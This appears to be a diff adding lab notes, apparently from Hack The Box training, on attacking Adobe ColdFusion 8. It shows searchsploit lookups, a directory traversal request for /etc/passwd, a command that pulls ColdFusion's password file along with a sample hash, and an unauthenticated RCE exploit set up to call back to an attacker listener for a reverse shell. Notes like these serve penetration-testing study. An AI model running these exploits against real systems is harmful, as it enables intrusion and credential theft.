@@ -2626,3 +2626,112 @@ PORT      STATE SERVICE
   * ColdFusion 8 Administrator login at `/CFIDE/administrator`.
 
 ---
+
+# 🧨 Attacking Adobe ColdFusion 8
+
+## 🔍 Reconnaissance and Enumeration
+
+### 🔎 Identifying Vulnerable Services
+
+* ColdFusion 8 detected.
+* Use `searchsploit` to identify known vulnerabilities:
+
+```bash
+$ searchsploit adobe coldfusion
+```
+
+#### 🔥 Relevant Exploits
+
+* **Directory Traversal** (CVE-2010-2861) – Exploit ID: `14641`
+* **Unauthenticated Remote Command Execution** (CVE-2009-2265) – Exploit ID: `50057`
+
+## 🕳️ Directory Traversal – CVE-2010-2861
+
+### 📖 Description
+
+Directory traversal vulnerability allows remote attackers to read arbitrary files via the `locale` parameter.
+
+### 🧪 Affected Files
+
+Examples:
+
+* `/CFIDE/administrator/settings/mappings.cfm`
+* `/CFIDE/administrator/enter.cfm`
+* `/logging/settings.cfm`
+
+### 🔗 Malicious Request Example
+
+```http
+http://<target>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
+```
+
+### 📂 Exploit Usage
+
+```bash
+$ searchsploit -p 14641
+$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
+$ python2 14641.py <host> <port> <file_path>
+```
+
+**Example:**
+
+```bash
+$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+```
+
+### 📜 Sample Output
+
+```properties
+#Wed Mar 22 20:53:51 EET 2017
+rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP
+password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+encrypted=true
+```
+
+## 💥 Unauthenticated RCE – CVE-2009-2265
+
+### 📖 Description
+
+Allows file upload via `FCKeditor`, leading to arbitrary code execution.
+
+### 📍 Endpoint
+
+```http
+/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
+```
+
+### 🧪 Exploit Setup
+
+```bash
+$ searchsploit -p 50057
+$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+```
+
+#### 🔧 Modify Exploit
+
+```python
+lhost = '10.10.14.55'  # Attacker (HTB VPN) IP
+lport = 4444           # Attacker listening port
+rhost = "10.129.247.30" # Target IP
+rport = 8500            # Target ColdFusion port
+```
+
+## 🧪 Exploit Execution
+
+```bash
+$ python3 50057.py
+```
+
+### 🖥️ Output Sample
+
+* JSP payload uploaded
+* Callback to attacker's listener (reverse shell)
+
+```bash
+Ncat: Connection from 10.129.247.30.
+Microsoft Windows [Version 6.1.7600]
+
+C:\ColdFusion8\runtime\bin> dir
+```
+
+---
